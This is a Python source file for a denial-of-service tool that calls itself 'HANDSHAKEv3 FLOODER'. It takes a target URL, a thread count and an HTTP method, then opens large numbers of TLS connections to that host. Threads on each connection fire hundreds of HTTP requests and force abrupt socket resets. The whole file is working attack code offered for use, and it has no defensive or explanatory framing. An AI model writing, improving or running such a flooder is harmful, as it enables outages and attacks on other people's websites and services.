import socket,ssl,threading,struct,sys
from MODEL.data import generate_url_path,get_target

def Rapid_sender(ssl_socket,byt):
   try:
    for _ in range(500):
     ssl_socket.write(byt[0]); ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
     ssl_socket.write(byt[1]); ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    ssl_socket.shutdown(socket.SHUT_RDWR)
    ssl_socket.close()
   except:pass

def Rapid(target,meth):
  try:
   path = 0
   for _ in range(500):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
    try:ssl_socket = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
    except:ssl_socket  = ssl.SSLContext()
    ssl_socket = ssl_socket.wrap_socket(s,server_hostname=target['host'])
    ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    threading.Thread(target=Rapid_sender,args=(ssl_socket,[f"{meth} {a} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()for a in ['/'+generate_url_path(num=path),target['uri']]])).start()
    path += 1
  except:pass

url = ''
meth = ''
thread = ''

if len(sys.argv) == 4:
   url = sys.argv[1]
   thread = int(sys.argv[2])
   meth = sys.argv[3]
else:
 print(f'WELCOME TO HANDSHAKEv3 FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
target = get_target(url)
for _ in range(int(thread)):
   for _ in range(10):threading.Thread(target=Rapid,args=(target,meth)).start()
